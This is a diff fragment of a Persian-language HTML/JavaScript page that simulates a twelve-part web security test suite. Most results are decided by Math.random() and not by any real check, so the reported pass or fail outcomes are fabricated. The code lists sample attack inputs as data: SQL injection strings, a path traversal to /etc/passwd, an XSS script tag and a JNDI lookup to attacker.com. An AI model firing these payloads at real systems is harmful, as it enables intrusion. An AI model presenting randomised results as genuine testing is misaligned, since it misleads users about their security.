+                        'از Content Security Policy (CSP) استفاده کنید.',
+                        true
+                    );
+                } else {
+                    addResult(
+                        'failure',
+                        'آسیب‌پذیری XSS',
+                        'سیستم در برابر تزریق کدهای مخرب آسیب‌پذیر است.',
+                        'از encodeURIComponent و DOMPurify استفاده کنید.',
+                        true
+                    );
+                }
+            }, 1800);
+        }
+
+        // ۴. تست CSP
+        function runCSPTest() {
+            addResult('warning', 'تست Content Security Policy', 'بررسی هدرهای CSP...');
+            
+            setTimeout(() => {
+                const hasCSP = Math.random() > 0.5; // 50% شانس موفقیت
+                
+                if (hasCSP) {
+                    addResult(
+                        'success',
+                        'CSP پیاده‌سازی شده',
+                        'هدرهای Content-Security-Policy در پاسخ سرور موجود است.',
+                        'سیاست‌های CSP را به صورت progressive اعمال کنید.'
+                    );
+                } else {
+                    addResult(
+                        'warning',
+                        'CSP پیاده‌سازی نشده',
+                        'هدرهای امنیتی CSP موجود نیست.',
+                        'CSP را با سیاست‌های مناسب پیاده‌سازی کنید.'
+                    );
+                }
+            }, 1000);
+        }
+
+        // ۵. تست CSRF
+        function runCSRFTest() {
+            addResult('warning', 'تست CSRF Protection', 'بررسی توکن‌های CSRF و هدرهای امنیتی...');
+            
+            setTimeout(() => {
+                const hasCSRFProtection = Math.random() > 0.3; // 70% شانس موفقیت
+                
+                if (hasCSRFProtection) {
+                    addResult(
+                        'success',
+                        'CSRF Protection فعال است',
+                        'سیستم از توکن‌های CSRF و هدرهای Referrer-Policy استفاده می‌کند.',
+                        'توکن‌های CSRF را مرتباً refresh کنید.',
+                        true
+                    );
+                } else {
+                    addResult(
+                        'failure',
+                        'آسیب‌پذیری CSRF',
+                        'سیستم در برابر حملات Cross-Site Request Forgery آسیب‌پذیر است.',
+                        'از توکن‌های CSRF و SameSite cookies استفاده کنید.',
+                        true
+                    );
+                }
+            }, 1400);
+        }
+
+        // ۶. تست Same-Origin
+        function runSameOriginTest() {
+            addResult('warning', 'تست Same-Origin Policy', 'بررسی هدرهای CORS و دسترسی‌های cross-origin...');
+            
+            setTimeout(() => {
+                const hasProperCORS = Math.random() > 0.4; // 60% شانس موفقیت
+                
+                if (hasProperCORS) {
+                    addResult(
+                        'success',
+                        'تنظیمات CORS مناسب است',
+                        'دسترسی‌های cross-origin به درستی محدود شده‌اند.',
+                        'تنها دامنه‌های مورد نیاز را در Allow-Origin لیست کنید.'
+                    );
+                } else {
+                    addResult(
+                        'warning',
+                        'تنظیمات CORS نیاز به بررسی دارد',
+                        'ممکن است دسترسی‌های بیش از حد مجاز وجود داشته باشد.',
+                        'از الگوی Allow-Origin خاص به جای * استفاده کنید.'
+                    );
+                }
+            }, 1100);
+        }
+
+        // ۷. تست ذخیره‌سازی توکن
+        function runTokenStorageTest() {
+            addResult('warning', 'تست ذخیره‌سازی امن توکن‌ها', 'بررسی روش‌های ذخیره‌سازی توکن...');
+            
+            setTimeout(() => {
+                const storageMethods = ['localStorage', 'sessionStorage', 'HttpOnly Cookies', 'In-memory'];
+                const recommendedMethod = 'HttpOnly Cookies + In-memory';
+                
+                const usesSecureMethod = Math.random() > 0.6; // 40% شانس موفقیت
+                
+                if (usesSecureMethod) {
+                    addResult(
+                        'success',
+                        'ذخیره‌سازی امن توکن',
+                        `توکن‌ها با روش ${recommendedMethod} ذخیره می‌شوند.`,
+                        'توکن‌های دسترسی کوتاه‌مدت و توکن‌های تمدید بلندمدت استفاده کنید.',
+                        true
+                    );
+                } else {
+                    addResult(
+                        'failure',
+                        'روش ذخیره‌سازی ناامن',
+                        'توکن‌ها در localStorage ذخیره می‌شوند که در برابر XSS آسیب‌پذیر است.',
+                        'از HttpOnly Cookies برای توکن‌های refresh استفاده کنید.',
+                        true
+                    );
+                }
+            }, 1300);
+        }
+
+        // ۸. تست انقضای توکن
+        function runTokenExpiryTest() {
+            addResult('warning', 'تست مدیریت انقضای توکن', 'بررسی زمان‌های انقضای توکن‌های دسترسی و تمدید...');
+            
+            setTimeout(() => {
+                const accessTokenExpiry = 15; // دقیقه
+                const refreshTokenExpiry = 7; // روز
+                
+                const hasProperExpiry = accessTokenExpiry <= 30 && refreshTokenExpiry <= 30;
+                
+                if (hasProperExpiry) {
+                    addResult(
+                        'success',
+                        'زمان‌های انقضای مناسب',
+                        `توکن دسترسی: ${accessTokenExpiry} دقیقه، توکن تمدید: ${refreshTokenExpiry} روز`,
+                        'توکن‌های دسترسی را کوتاه‌مدت (15-30 دقیقه) نگه دارید.'
+                    );
+                } else {
+                    addResult(
+                        'warning',
+                        'زمان‌های انقضای طولانی',
+                        'توکن‌ها برای مدت طولانی معتبر هستند که خطرناک است.',
+                        'زمان انقضا را کاهش داده و سیستم refresh پیاده‌سازی کنید.'
+                    );
+                }
+            }, 1000);
+        }
+
+        // ۹. تست اعتبارسنجی ورودی
+        function runInputValidationTest() {
+            const maliciousInputs = [
+                "admin'--",
+                "<script>evil()</script>",
+                "../../etc/passwd",
+                "${jndi:ldap://attacker.com}"
+            ];
+            
+            addResult('warning', 'تست اعتبارسنجی ورودی', `بررسی ${maliciousInputs.length} ورودی مخرب...`);
+            
+            setTimeout(() => {
+                const hasValidation = Math.random() > 0.2; // 80% شانس موفقیت
+                
+                if (hasValidation) {
+                    addResult(
+                        'success',
+                        'اعتبارسنجی ورودی فعال است',
+                        `تمام ${maliciousInputs.length} ورودی مخرب شناسایی و رد شدند.`,
+                        'از Whitelist به جای Blacklist برای اعتبارسنجی استفاده کنید.',
+                        true
+                    );
+                } else {
+                    addResult(
+                        'failure',
+                        'اعتبارسنجی ورودی ضعیف',
+                        'ورودی‌های مخرب می‌توانند از سیستم عبور کنند.',
+                        'اعتبارسنجی سرورساید و کلاینتی هر دو پیاده‌سازی کنید.',
+                        true
+                    );
+                }
+            }, 1600);
+        }
+
+        // ۱۰. تست SQL Injection
+        function runSQLInjectionTest() {
+            const sqlPayloads = [
+                "' OR '1'='1",
+                "'; DROP TABLE users;--",
+                "' UNION SELECT * FROM passwords--",
+                "' OR 1=1--"
+            ];
+            
+            addResult('warning', 'تست SQL Injection Prevention', `بررسی ${sqlPayloads.length} کوئری مخرب...`);
+            
+            setTimeout(() => {
+                const isProtected = Math.random() > 0.1; // 90% شانس موفقیت
+                
+                if (isProtected) {
+                    addResult(
+                        'success',
+                        'محافظت در برابر SQL Injection',
+                        `تمام ${sqlPayloads.length} payload شناسایی و مسدود شدند.`,
+                        'همیشه از Parameterized Queries استفاده کنید.',
+                        true
+                    );
+                } else {
+                    addResult(
+                        'failure',
+                        'آسیب‌پذیری SQL Injection',
+                        'سیستم در برابر تزریق SQL آسیب‌پذیر است!',
+                        'هرگز کوئری‌ها را با string concatenation نسازید.',
+                        true
+                    );
+                }
+            }, 1700);
+        }
+
+        // ۱۱. تست رمزنگاری داده
+        function runDataEncryptionTest() {
+            addResult('warning', 'تست رمزنگاری داده‌های حساس', 'بررسی رمزنگاری داده‌های کاربر در IndexedDB...');
+            
+            setTimeout(() => {
+                const hasEncryption = Math.random() > 0.5; // 50% شانس موفقیت
+                
+                if (hasEncryption) {
+                    addResult(
+                        'success',
+                        'رمزنگاری داده‌ها فعال است',
+                        'داده‌های حساس کاربر با AES-256 رمزنگاری می‌شوند.',
+                        'کلیدهای رمزنگاری را در Secure Storage نگهداری کنید.'
+                    );
+                } else {
+                    addResult(
+                        'warning',
+                        'داده‌ها رمزنگاری نشده‌اند',
+                        'داده‌های حساس در IndexedDB به صورت plaintext ذخیره می‌شوند.',
+                        'از Web Crypto API برای رمزنگاری داده‌ها استفاده کنید.'
+                    );
+                }
+            }, 1200);
+        }
+
+        // ۱۲. تست کوکی‌های امن
+        function runSecureCookiesTest() {
+            addResult('warning', 'تست تنظیمات امن کوکی‌ها', 'بررسی flagهای Secure, HttpOnly, SameSite...');
+            
+            setTimeout(() => {
+                const hasSecureFlags = Math.random() > 0.4; // 60% شانس موفقیت
+                
+                if (hasSecureFlags) {
+                    addResult(
+                        'success',
+                        'تنظیمات امن کوکی‌ها',
+                        'کوکی‌ها با flagهای Secure, HttpOnly, SameSite=Strict تنظیم شده‌اند.',
+                        'از SameSite=Strict برای کوکی‌های حساس استفاده کنید.'
+                    );
+                } else {
+                    addResult(
+                        'warning',
+                        'تنظیمات ناامن کوکی‌ها',
+                        'کوکی‌ها فاقد flagهای امنیتی لازم هستند.',
+                        'همیشه flagهای Secure و HttpOnly را فعال کنید.'
+                    );
+                }
+            }, 1100);
+        }
+
+        // اجرای حمله انتخاب شده
+        function runSelectedAttack() {
+            addResult('warning', `شبیه‌سازی حمله ${selectedAttack.toUpperCase()}`, 'در حال اجرای حمله شبیه‌سازی شده...');
+            
+            setTimeout(() => {
+                const attackResults = {
+                    xss: {
+                        success: Math.random() > 0.3,
+                        message: 'حمله XSS شبیه‌سازی شد',
+                        successDetails: 'سیستم payload مخرب را شناسایی و مسدود کرد.',
+                        failureDetails: 'سیستم در برابر تزریق کد آسیب‌پذیر است!'
+                    },
+                    csrf: {
+                        success: Math.random() > 0.4,
+                        message: 'حمله CSRF شبیه‌سازی شد',
+                        successDetails: 'درخواست جعلی به دلیل عدم وجود توکن CSRF رد شد.',
+                        failureDetails: 'درخواست جعلی با موفقیت اجرا شد!'
+                    },
+                    injection: {
+                        success: Math.random() > 0.2,
+                        message: 'حمله SQL Injection شبیه‌سازی شد',
+                        successDetails: 'کوئری مخرب شناسایی و مسدود شد.',
+                        failureDetails: 'کوئری مخرب با موفقیت اجرا شد!'
+                    },
+                    bruteforce: {
+                        success: Math.random() > 0.3,
+                        message: 'حمله Bruteforce شبیه‌سازی شد',
+                        successDetails: 'سیستم پس از 5 تلاش ناموفق، حمله را مسدود کرد.',
+                        failureDetails: 'حمله توانست رمز عبور را حدس بزند!'
+                    }
+                };
+                
+                const result = attackResults[selectedAttack];
+                
+                if (result.success) {
+                    addResult(
+                        'success',
+                        `مقاومت در برابر ${selectedAttack.toUpperCase()}`,
+                        result.successDetails,
+                        'سیستم امنیتی به خوبی عمل کرد.'
+                    );
+                } else {
+                    addResult(
+                        'failure',
+                        `آسیب‌پذیری ${selectedAttack.toUpperCase()}`,
+                        result.failureDetails,
+                        'اقدامات امنیتی لازم را پیاده‌سازی کنید.',
+                        true
+                    );
+                }
+            }, 2000);
+        }
+
+        // اجرای تمام تست‌ها
+        function runAllSecurityTests() {
+            addResult('info', 'شروع تست‌های امنیتی جامع', 'اجرای تمام ۱۲ تست امنیتی...');
+            
+            const tests = [
+                { fn: runBruteforceTest, delay: 500 },
+                { fn: runRateLimitTest, delay: 2000 },
+                { fn: runXSSTest, delay: 3500 },
+                { fn: runCSPTest, delay: 5000 },
+                { fn: runCSRFTest, delay: 6500 },
+                { fn: runSameOriginTest, delay: 8000 },
+                { fn: runTokenStorageTest, delay: 9500 },
+                { fn: runTokenExpiryTest, delay: 11000 },
+                { fn: runInputValidationTest, delay: 12500 },
+                { fn: runSQLInjectionTest, delay: 14000 },
+                { fn: runDataEncryptionTest, delay: 15500 },
+                { fn: runSecureCookiesTest, delay: 17000 }
+            ];
+            
+            tests.forEach(test => {
+                setTimeout(test.fn, test.delay);
+            });
+            
+            setTimeout(() => {
+                addResult('success', 'تست‌های امنیتی تکمیل شد', 
+                    `تمام ${tests.length} تست امنیتی اجرا شدند.`,
+                    'نتایج را در پنل خلاصه بررسی کنید.');
+            }, 18500);
+        }
+
+        // مقداردهی اولیه
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('🛡️ سیستم تست امنیتی بارگذاری شد');
+            updateSecurityScore();
+        });
+    </script>
+</body>
+  </html>
